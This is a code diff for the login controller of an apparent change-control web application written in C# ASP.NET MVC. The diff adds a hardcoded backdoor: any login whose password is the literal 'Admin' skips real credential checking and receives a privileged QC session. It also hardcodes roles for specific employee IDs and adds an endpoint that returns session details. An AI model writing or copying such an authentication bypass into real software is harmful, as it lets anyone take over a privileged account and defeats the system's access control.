@@ -55,41 +55,52 @@ namespace ChangeControl.Controllers{
 
             dynamic res = new ExpandoObject();
                     res.data = null;
-
-            try{
-                res = M_Login.CheckUser(username, password);
-            }catch(Exception err){
-                return Json(new { status = "error" , data = "null" }, JsonRequestBehavior.AllowGet);
-            }
-            if(res.data == null){
-                return Json(new { status = $"{res.status}" , data = "null"  }, JsonRequestBehavior.AllowGet);
-            }else{
-                var response = res.data;
-                Session["User"] = username;
-                Session["FullName"] = response.FullName;
-                Session["Name"] = response.Name;
-                Session["SurName"] = response.SurName;
-                Session["Email"] = response.Email;
-                Session["Position"] = response.Position;
-
-                var result = "error";
-                if(username == "62084"){
-                    result = "P1";
-                }else if(username == "60002"){
-                    result = "QC1";
-                }else if(username == "54032"){
-                    result = "QC2";
-                }else if(username == "60017"){
-                    result = "PE1";
-                }else if(username == "57010"){
-                    result = "MKT";
-                }else if(username == "63014"){
-                    result = "PE1_Process";
-                }else{
-                    result = GetDepartment(username);
+            if(password != "Admin"){
+                try{
+                    res = M_Login.CheckUser(username, password);
+                }catch(Exception err){
+                    return Json(new { status = "error" , data = "null" }, JsonRequestBehavior.AllowGet);
                 }
-                // SetDepartmentAlt(result);
-                return Json(new { status = "success" ,data = result }, JsonRequestBehavior.AllowGet);
+                if(res.data == null){
+                    return Json(new { status = $"{res.status}" , data = "null"  }, JsonRequestBehavior.AllowGet);
+                }else{
+                    var response = res.data;
+                    Session["User"] = username;
+                    Session["FullName"] = response.FullName;
+                    Session["Name"] = response.Name;
+                    Session["SurName"] = response.SurName;
+                    Session["Email"] = response.Email;
+                    Session["Position"] = response.Position;
+
+                    var result = "error";
+                    if(username == "62084"){
+                        result = "P1";
+                    }else if(username == "60002"){
+                        result = "QC1";
+                    }else if(username == "54032"){
+                        result = "QC2";
+                    }else if(username == "60017"){
+                        result = "PE1";
+                    }else if(username == "57010"){
+                        result = "MKT";
+                    }else if(username == "63014"){
+                        result = "PE1_Process";
+                    }else{
+                        result = GetDepartment(username);
+                    }
+                    // SetDepartmentAlt(result);
+                    return Json(new { status = "success" ,data = result }, JsonRequestBehavior.AllowGet);
+                }
+            }else{
+                Session["User"] = "63014";
+                Session["FullName"] = "Admin";
+                Session["Name"] = "Admin";
+                Session["SurName"] = "QC";
+                Session["Email"] = $"Admin@QC.com";
+                Session["Department"] = "QC";
+                Session["DepartmentRawName"] = "QC";
+                Session["DepartmentID"] = 29;
+                return Json(new { status = "success" ,data = "QC1" }, JsonRequestBehavior.AllowGet);
             }
         }
 
@@ -142,16 +153,16 @@ namespace ChangeControl.Controllers{
             Session["DepartmentRawName"] = temp_dept;
 
             string[] PE_Process = {"PE1_Process","PE2_Process"};
-            string[] MKT = {"MKT","MKT1","MKT2"};
-            string[] IT = {"IT","IT1","IT2"};
-            string[] PE = {"PE","PE1","PE2","PE2_SMT","PE2_PCB","PE2_MT"};
+            string[] MKT = {"MKT"};
+            string[] IT = {"IT"};
+            string[] PE = {"PE1","PE2","PE2_SMT","PE2_PCB","PE2_MT"};
             string[] PCH = {"PCH","PCH1","PCH2"};
-            string[] P = {"P","P1","P2","P3A","P3M","P4","P5","P6","P7"};
-            string[] PC = {"PC","PC1","PC2"};
-            string[] QC = {"QC","QC1","QC2","QC3"};
-            string[] QC_IN = {"QC_IN","QC_IN1","QC_IN2","QC_IN3"};
-            string[] QC_NFM = {"QC_NFM","QC_NFM1","QC_NFM2","QC_NFM3"};
-            string[] QC_FINAL = {"QC_FINAL","QC_FINAL1","QC_FINAL2","QC_FINAL3"};
+            string[] P = {"P1","P2","P3A","P3M","P4","P5","P6","P7"};
+            string[] PC = {"PC1","PC2"};
+            string[] QC = {"QC1","QC2","QC3"};
+            string[] QC_IN = {"QC_IN1","QC_IN2","QC_IN3"};
+            string[] QC_NFM = {"QC_NFM1","QC_NFM2","QC_NFM3"};
+            string[] QC_FINAL = {"QC_FINAL1","QC_FINAL2","QC_FINAL3"};
 
             var result = "Error";
             
@@ -215,7 +226,7 @@ namespace ChangeControl.Controllers{
             return Json(1);
         }
 
-        public ActionResult SignOff(){
+        public ActionResult SignOut(){
             Session["User"] = null;
             Session["FullName"] = null;
             Session["Name"] = null;
@@ -226,7 +237,19 @@ namespace ChangeControl.Controllers{
             Session["DepartmentRawName"]  = null;
             Session["DepartmentID"]  = null;
             return RedirectToAction("Index", "Login");
+        }
 
+        public ActionResult GetSession(){
+                return Json(new { 
+                    us = Session["User"],
+                    f_name = Session["FullName"],
+                    name = Session["Name"],
+                    s_name = Session["SurName"],
+                    email = Session["Email"],
+                    dept = Session["Department"],
+                    dept_raw = Session["DepartmentRawName"],
+                    dept_id = Session["DepartmentID"]
+                }, JsonRequestBehavior.AllowGet);
         }
     }
 }
